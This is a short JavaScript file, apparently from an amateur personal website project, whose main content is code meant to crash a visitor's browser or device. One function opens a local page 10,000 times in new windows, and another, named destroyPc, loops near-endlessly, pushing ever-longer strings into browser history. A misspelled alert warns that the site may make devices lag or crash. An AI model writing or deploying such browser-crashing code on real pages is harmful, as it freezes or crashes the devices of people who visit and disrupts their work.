
function openTab(){
  for (let i = 0; i < 10000; i++) {
    window.open("file:///Users/louisroseberry/Desktop/personnel/vs%20code%20projects/cool%20website/index.html");
  };
};

function destroyPc(){
  var total = "";
  for( var i = 0; i < 10000000000000; i++ ) {
    total += i.toString();
    history.pushState(0,0, total );
  };
};

alert("DISCLAMER!!! This website can make your electronic devise lag or crash");